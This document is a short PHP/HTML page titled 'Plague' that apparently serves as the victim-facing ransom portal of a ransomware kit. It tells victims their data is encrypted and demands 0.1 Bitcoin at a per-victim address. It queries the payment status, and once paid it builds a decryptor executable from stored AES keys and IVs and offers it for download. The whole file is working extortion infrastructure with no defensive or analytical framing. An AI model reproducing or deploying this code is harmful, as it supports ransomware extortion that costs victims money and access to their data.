<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Plague</title>
    </head>
    <body>
        <div style="width:80%; margin:0 auto;word-wrap: break-word;">
            <p>Your data has been encrypted. Send 0.1 Bitcoin to the address <?php echo $id?> to get your data recovered.</p>
            <?php $amount = getPaiementAmount($id)?>
            <p>Amount payed : <?php echo $amount ?> BTC</p>
            <?php 
            if ($amount > 0.1)
            { ?>
                <p>Paiement status : Done !</p>
                <p>You can now recover your data with this Decryptor ! Execute it on the infected computer.</p>
                <p>BE CAREFUL ! DO NOT EXECUTE THIS ON ANOTHER COMPUTER BECAUSE YOUR DATA WILL BE ALTERATED ! CHECK IF THE ID IS CORRECT.</p>
                <?php 
                generate_decryptor($id, getAesKeyDB($id)[0], getIvDB($id)[0]);
                ?>
                <form method="get" action=<?php echo "decryptor/" . $id . ".exe" ?> >
                    <button type="submit">Download Decryptor !</button>
                </form>
                <?php
            }
            else
                echo "Paiement status : Waiting for paiement.\n";
            ?>
        </div>
    </body>
</html>
